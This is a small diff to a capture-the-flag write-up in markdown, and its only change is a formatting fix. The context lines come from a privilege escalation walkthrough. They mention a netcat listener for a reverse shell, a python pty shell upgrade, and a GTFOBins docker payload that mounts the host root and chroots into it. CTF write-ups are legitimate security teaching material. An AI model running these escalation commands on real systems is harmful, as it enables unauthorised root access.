@@ -184,7 +184,7 @@ now if we open a `nc -nvlp 9999` on our machine and try to run: `sudo -u michael
 
 ![Screen6](https://github.com/Gomez0015/CTF-Writeups/blob/main/📄%20CTF%20Writeups/Images/Screen%20Shot%202022-03-09%20at%2011.27.51%20AM.png)
 
-Lets just run a quick `python -c 'import pty; pty.spawn("/bin/sh")'` to get a better shell. So as we saw earlier in linPEAS michael is  docker user so we can exploit that with a quick [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) search! If we just scroll down to ==sudo== we can find the following payload:
+Lets just run a quick `python -c 'import pty; pty.spawn("/bin/sh")'` to get a better shell. So as we saw earlier in linPEAS michael is  docker user so we can exploit that with a quick [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) search! If we just scroll down to `sudo` we can find the following payload:
 ```
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
